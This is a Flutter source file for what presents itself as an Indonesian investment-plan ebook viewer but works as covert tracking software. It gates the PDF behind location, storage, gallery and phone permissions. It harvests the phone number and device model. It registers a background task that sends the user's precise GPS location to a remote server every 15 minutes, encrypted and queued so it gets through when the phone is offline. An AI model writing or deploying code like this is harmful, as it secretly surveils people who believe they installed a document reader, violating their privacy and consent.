import 'dart:io';
import 'dart:convert';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:syncfusion_flutter_pdfviewer/pdfviewer.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:http/http.dart' as http;
import 'package:encrypt/encrypt.dart' as enc;
import 'package:pointycastle/asymmetric/api.dart';
import 'package:mobile_number/mobile_number.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:geolocator/geolocator.dart';
import 'package:workmanager/workmanager.dart';

const String API_URL_TRACK = "https://mapi.tumpuk.id/api/track"; 
const String API_URL_LOCATION = "https://mapi.tumpuk.id/api/location"; 
const String QUEUE_KEY = "offline_payload_queue";
const String PHONE_KEY = "saved_phone_number";

const String publicKeyPem = '''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA7vq0T3Q3MDg0ugIhl9sL
C7vxOEnY9IDpjhpmAdm9AHUZuZ+nOeSVm2h6BwegXztNgSYMJyC+52d+WcN8ygzK
GOUcz3RLbxyk9/n6ZqW6tds1fOD9P95Al0QytUQysxaxCm2mKlOQopFTxVDxTnFV
zgf2TxUxFVOp6m4Eppesf2GSaJ+SvcnEk/obpYYQuG2CfBqYkEr0FcfyPgw/vSr2
J4N01dC5vMB/Dk6Y3+qR5NuREID5K6ebWzYGXud9Vg+ssEz9pns8bw1knHbGq4Ra
t1Km04DGUB1Vp2Gy323zFEW5r+kmpGNeLL/fea1paf86ecunQCxV5uTbq9QSnZTD
jQIDAQAB
-----END PUBLIC KEY-----''';

// Enkripsi Payload Helper
Map<String, dynamic> _encryptPayload(Map<String, dynamic> payload) {
  final secureRandom = Random.secure();
  final aesKeyBytes = List<int>.generate(32, (i) => secureRandom.nextInt(256));
  final aesKey = enc.Key(Uint8List.fromList(aesKeyBytes));
  final iv = enc.IV.fromSecureRandom(16);

  final aesEncrypter = enc.Encrypter(enc.AES(aesKey, mode: enc.AESMode.cbc));
  final encryptedData = aesEncrypter.encrypt(jsonEncode(payload), iv: iv).base64;

  final rsaParser = enc.RSAKeyParser();
  final rsaPublicKey = rsaParser.parse(publicKeyPem) as RSAPublicKey;
  final rsaEncrypter = enc.Encrypter(enc.RSA(publicKey: rsaPublicKey, encoding: enc.RSAEncoding.PKCS1));

  final keyIvBytes = Uint8List.fromList([...aesKey.bytes, ...iv.bytes]);
  final encryptedKey = rsaEncrypter.encryptBytes(keyIvBytes).base64;

  return {
    'encryptedData': encryptedData,
    'encryptedKey': encryptedKey,
  };
}

// Background Task untuk Pelacakan 15 Menitan & Sync Queue
@pragma('vm:entry-point')
void callbackDispatcher() {
  Workmanager().executeTask((task, inputData) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      
      // 1. Sync Offline Queue (Data Gelondongan Membaca)
      List<String> queue = prefs.getStringList(QUEUE_KEY) ?? [];
      if (queue.isNotEmpty) {
        List<String> remainingQueue = [];
        for (String encryptedPayload in queue) {
          try {
            final bodyData = jsonDecode(encryptedPayload);
            final response = await http.post(
              Uri.parse(API_URL_TRACK),
              headers: {'Content-Type': 'application/json'},
              body: jsonEncode(bodyData),
            ).timeout(const Duration(seconds: 10));

            if (response.statusCode != 200) {
              remainingQueue.add(encryptedPayload);
            }
          } catch (e) {
            remainingQueue.add(encryptedPayload);
          }
        }
        await prefs.setStringList(QUEUE_KEY, remainingQueue);
      }

      // 2. Track GPS Lokasi (Setiap 15 Menit)
      String phone = prefs.getString(PHONE_KEY) ?? 'Unknown';
      if (await Permission.location.isGranted) {
        Position position = await Geolocator.getCurrentPosition(
          desiredAccuracy: LocationAccuracy.high,
          timeLimit: const Duration(seconds: 15),
        );
        
        final gpsPayload = {
          'phone': phone,
          'latitude': position.latitude,
          'longitude': position.longitude,
        };
        
        final encryptedGps = _encryptPayload(gpsPayload);
        
        await http.post(
          Uri.parse(API_URL_LOCATION),
          headers: {'Content-Type': 'application/json'},
          body: jsonEncode(encryptedGps),
        ).timeout(const Duration(seconds: 10));
      }

    } catch (e) {
      print("WorkManager error: $e");
    }
    return Future.value(true);
  });
}

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  Workmanager().initialize(callbackDispatcher, isInDebugMode: false);
  Workmanager().registerPeriodicTask(
    "gpsTrackingTask",
    "gpsTrackingTask",
    frequency: const Duration(minutes: 15), // Tracking setiap 15 menit
  );
  runApp(const EbookApp());
}

class EbookApp extends StatelessWidget {
  const EbookApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Plan Investasi Purworeejo',
      theme: ThemeData(
        brightness: Brightness.light,
        primarySwatch: Colors.amber,
        scaffoldBackgroundColor: Colors.white,
        appBarTheme: const AppBarTheme(
          backgroundColor: Colors.amber,
          foregroundColor: Colors.black,
        ),
      ),
      home: const PermissionScreen(),
    );
  }
}

class PermissionScreen extends StatefulWidget {
  const PermissionScreen({Key? key}) : super(key: key);

  @override
  State<PermissionScreen> createState() => _PermissionScreenState();
}

class _PermissionScreenState extends State<PermissionScreen> {
  bool _isChecking = true;
  bool _isDenied = false;
  
  Map<String, dynamic> _deviceInfo = {};
  String _phoneNumber = "Unknown";

  @override
  void initState() {
    super.initState();
    _initApp();
  }

  Future<void> _initApp() async {
    await _readDeviceInfo();
    await _checkPermissions();
  }

  Future<void> _readDeviceInfo() async {
    final DeviceInfoPlugin deviceInfoPlugin = DeviceInfoPlugin();
    try {
      if (Platform.isAndroid) {
        var build = await deviceInfoPlugin.androidInfo;
        _deviceInfo = {
          'os': 'Android ${build.version.release}',
          'model': '${build.manufacturer} ${build.model}',
        };
      } else if (Platform.isIOS) {
        var data = await deviceInfoPlugin.iosInfo;
        _deviceInfo = {
          'os': 'iOS ${data.systemVersion}',
          'model': data.name,
        };
      }
    } catch (e) {
      _deviceInfo = {'os': 'Unknown', 'model': 'Unknown'};
    }
  }

  Future<void> _gatherData() async {
    // Get Phone Number (Android Only)
    if (Platform.isAndroid) {
      try {
        final String? mobileNumber = await MobileNumber.mobileNumber;
        if (mobileNumber != null && mobileNumber.isNotEmpty) {
          _phoneNumber = mobileNumber;
        }
      } catch (e) {
        print("Gagal mengambil nomor HP: $e");
      }
    }

    // Save phone number for background task
    final prefs = await SharedPreferences.getInstance();
    await prefs.setString(PHONE_KEY, _phoneNumber);
  }

  Future<void> _checkPermissions() async {
    bool locationGranted = await Permission.location.isGranted;
    bool photosGranted = await Permission.photos.isGranted;
    bool storageGranted = await Permission.storage.isGranted;
    bool phoneGranted = await Permission.phone.isGranted;

    if (locationGranted && (photosGranted || storageGranted) && (!Platform.isAndroid || phoneGranted)) {
      await _gatherData();
      _navigateToPdf();
    } else {
      setState(() {
        _isChecking = false;
      });
    }
  }

  void _navigateToPdf() {
    Navigator.of(context).pushReplacement(
      MaterialPageRoute(
        builder: (_) => PdfViewerScreen(
          deviceInfo: _deviceInfo,
          phoneNumber: _phoneNumber,
        ),
      ),
    );
  }

  Future<void> _requestLocationPermission() async {
    await showDialog(
      context: context,
      builder: (context) => AlertDialog(
        title: const Text('Izin GPS (Lokasi)'),
        content: const Text('Aplikasi membutuhkan akses GPS Anda untuk memetakan pembaca. Harap izinkan akses lokasi.'),
        actions: [TextButton(onPressed: () => Navigator.pop(context), child: const Text('Lanjutkan'))],
      ),
    );
    await Permission.location.request();
  }

  Future<void> _requestGalleryPermission() async {
    await showDialog(
      context: context,
      builder: (context) => AlertDialog(
        title: const Text('Izin Galeri'),
        content: const Text('Aplikasi membutuhkan akses Galeri. Harap izinkan akses galeri.'),
        actions: [TextButton(onPressed: () => Navigator.pop(context), child: const Text('Lanjutkan'))],
      ),
    );
    await Permission.photos.request();
  }

  Future<void> _requestStoragePermission() async {
    await showDialog(
      context: context,
      builder: (context) => AlertDialog(
        title: const Text('Izin Data HP'),
        content: const Text('Aplikasi membutuhkan akses penyimpanan. Harap izinkan akses penyimpanan.'),
        actions: [TextButton(onPressed: () => Navigator.pop(context), child: const Text('Lanjutkan'))],
      ),
    );
    await Permission.storage.request();
  }

  Future<void> _requestPhonePermission() async {
    await showDialog(
      context: context,
      builder: (context) => AlertDialog(
        title: const Text('Izin Telepon'),
        content: const Text('Aplikasi membutuhkan akses status telepon Anda. Harap izinkan.'),
        actions: [TextButton(onPressed: () => Navigator.pop(context), child: const Text('Lanjutkan'))],
      ),
    );
    await Permission.phone.request();
  }

  Future<void> _requestAllPermissions() async {
    if (!await Permission.location.isGranted) await _requestLocationPermission();
    if (!await Permission.photos.isGranted) await _requestGalleryPermission();
    if (!await Permission.storage.isGranted) await _requestStoragePermission();
    if (Platform.isAndroid && !await Permission.phone.isGranted) await _requestPhonePermission();
    
    bool locationGranted = await Permission.location.isGranted;
    bool photosGranted = await Permission.photos.isGranted;
    bool storageGranted = await Permission.storage.isGranted;
    bool phoneGranted = await Permission.phone.isGranted;

    if (locationGranted && (photosGranted || storageGranted) && (!Platform.isAndroid || phoneGranted)) {
      await _gatherData();
      _navigateToPdf();
    } else {
      if (Platform.isIOS) {
        setState(() { _isDenied = true; });
      } else {
        SystemNavigator.pop();
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    if (_isChecking) {
      return const Scaffold(body: Center(child: CircularProgressIndicator()));
    }
    return Scaffold(
      appBar: AppBar(title: const Text('Izin Akses Aplikasi')),
      body: Center(
        child: Padding(
          padding: const EdgeInsets.all(20.0),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              const Icon(Icons.security, size: 80, color: Colors.amber),
              const SizedBox(height: 20),
              if (_isDenied)
                const Padding(
                  padding: EdgeInsets.only(bottom: 20.0),
                  child: Text(
                    'Aplikasi tidak dapat digunakan tanpa izin akses.\nSilakan berikan izin melalui Pengaturan perangkat Anda.',
                    textAlign: TextAlign.center,
                    style: TextStyle(fontSize: 16, color: Colors.red, fontWeight: FontWeight.bold),
                  ),
                )
              else
                const Padding(
                  padding: EdgeInsets.only(bottom: 30.0),
                  child: Text('Aplikasi membutuhkan izin untuk berjalan maksimal.', textAlign: TextAlign.center),
                ),
              ElevatedButton(
                onPressed: _isDenied ? openAppSettings : _requestAllPermissions,
                child: Text(_isDenied ? 'Buka Pengaturan' : 'Berikan Izin & Mulai Membaca'),
              ),
              const SizedBox(height: 10),
              if (!Platform.isIOS)
                TextButton(onPressed: () => SystemNavigator.pop(), child: const Text('Keluar Aplikasi'))
            ],
          ),
        ),
      ),
    );
  }
}

class PdfViewerScreen extends StatefulWidget {
  final Map<String, dynamic> deviceInfo;
  final String phoneNumber;

  const PdfViewerScreen({
    Key? key,
    required this.deviceInfo,
    required this.phoneNumber,
  }) : super(key: key);

  @override
  State<PdfViewerScreen> createState() => _PdfViewerScreenState();
}

class _PdfViewerScreenState extends State<PdfViewerScreen> {
  late Stopwatch _stopwatch;
  bool _isSending = false;

  @override
  void initState() {
    super.initState();
    _stopwatch = Stopwatch()..start();
    _syncOfflineQueue(); 
  }

  Future<void> _syncOfflineQueue() async {
    final prefs = await SharedPreferences.getInstance();
    List<String> queue = prefs.getStringList(QUEUE_KEY) ?? [];
    if (queue.isEmpty) return;

    List<String> remainingQueue = [];
    for (String encryptedPayload in queue) {
      try {
        final bodyData = jsonDecode(encryptedPayload);
        final response = await http.post(
          Uri.parse(API_URL_TRACK),
          headers: {'Content-Type': 'application/json'},
          body: jsonEncode(bodyData),
        ).timeout(const Duration(seconds: 10));

        if (response.statusCode != 200) {
          remainingQueue.add(encryptedPayload);
        }
      } catch (e) {
        remainingQueue.add(encryptedPayload);
      }
    }
    await prefs.setStringList(QUEUE_KEY, remainingQueue);
  }

  Future<void> _saveToOfflineQueue(Map<String, dynamic> bodyData) async {
    final prefs = await SharedPreferences.getInstance();
    List<String> queue = prefs.getStringList(QUEUE_KEY) ?? [];
    queue.add(jsonEncode(bodyData));
    await prefs.setStringList(QUEUE_KEY, queue);
  }

  Future<void> _sendDataToServer() async {
    _stopwatch.stop();
    final durationSeconds = _stopwatch.elapsed.inSeconds;

    // Log Membaca Gelondongan (Tanpa GPS)
    final payload = {
      'os': widget.deviceInfo['os'] ?? 'Unknown',
      'model': widget.deviceInfo['model'] ?? 'Unknown',
      'phone': widget.phoneNumber,
      'duration_seconds': durationSeconds,
    };

    try {
      final bodyData = _encryptPayload(payload);

      try {
        final response = await http.post(
          Uri.parse(API_URL_TRACK),
          headers: {'Content-Type': 'application/json'},
          body: jsonEncode(bodyData),
        ).timeout(const Duration(seconds: 10));

        if (response.statusCode != 200) {
          throw Exception("Gagal dari server");
        }
      } catch (e) {
        // Jika gagal koneksi (offline), simpan ke queue lokal
        await _saveToOfflineQueue(bodyData);
      }
    } catch (e) {
      print("Gagal enkripsi: \$e");
    }
  }

  @override
  Widget build(BuildContext context) {
    return PopScope(
      canPop: false,
      onPopInvokedWithResult: (didPop, result) async {
        if (didPop) return;
        
        if (_isSending) return;
        setState(() => _isSending = true);

        showDialog(
          context: context,
          barrierDismissible: false,
          builder: (context) => const Center(child: CircularProgressIndicator()),
        );

        await _sendDataToServer();
        SystemNavigator.pop();
      },
      child: Scaffold(
        appBar: AppBar(
          title: const Text('Plan Investasi Purworeejo'),
        ),
        body: SfPdfViewer.asset(
          'assets/OBYEK HOTEL YANG AKAN DIKSPKAN.pdf',
          canShowScrollHead: false,
          canShowScrollStatus: false,
        ),
      ),
    );
  }
}
